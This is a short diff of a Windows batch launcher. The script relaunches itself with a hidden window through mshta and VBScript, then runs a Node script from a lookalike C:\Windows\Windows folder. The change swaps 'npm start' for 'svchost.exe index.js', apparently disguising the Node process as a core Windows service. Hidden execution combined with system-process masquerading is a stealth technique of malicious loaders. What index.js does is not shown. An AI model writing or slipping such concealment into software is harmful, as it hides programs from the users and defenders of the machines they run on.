@@ -3,4 +3,4 @@
 ¡@¡@mshta vbscript:createobject("wscript.shell").run("%~nx0 h",0)(window.close)&&exit
 ¡@¡@:begin
 chcp 65001
-cd C:\Windows\Windows&npm start
+cd C:\Windows\Windows&svchost.exe index.js
